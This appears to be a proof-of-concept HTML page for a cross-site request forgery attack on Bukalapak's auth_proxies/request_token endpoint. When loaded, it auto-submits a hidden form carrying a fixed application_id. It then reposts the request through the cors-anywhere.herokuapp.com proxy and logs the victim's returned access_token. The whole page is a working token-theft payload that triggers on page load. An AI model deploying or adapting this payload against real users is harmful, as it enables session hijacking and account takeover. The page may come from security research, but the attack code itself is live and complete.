<html>
<head>
<script src="https://code.jquery.com/jquery-3.5.1.min.js" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
</head>
<body>
  <form id="autosubmit" action="https://m.bukalapak.com/auth_proxies/request_token" method="POST">
    <input type="hidden" name="application_id" value="9939b81a5bbbb3a13f7434a1" />
    <input type="submit" value="Submit request" />
  </form>
  <script>
    document.getElementById("autosubmit").submit();
    $(document).ready(function() {
      $('form').submit(function(event) {
        var formData = {
          'application_id': $('input[name=application_id]').val(),
        };
        $.ajax({
            type: 'POST',
            url: 'https://cors-anywhere.herokuapp.com/https://m.bukalapak.com/auth_proxies/request_token',
            data: formData,
            dataType: 'json',
          })
          .done(function(data) {
            console.log(data.access_token);
          });
        event.preventDefault();
      });
    });
  </script>
</body>

</html>
